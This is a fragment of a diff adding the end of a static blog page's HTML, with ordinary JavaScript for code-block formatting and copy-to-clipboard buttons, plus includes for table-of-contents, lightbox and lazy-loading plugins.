+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
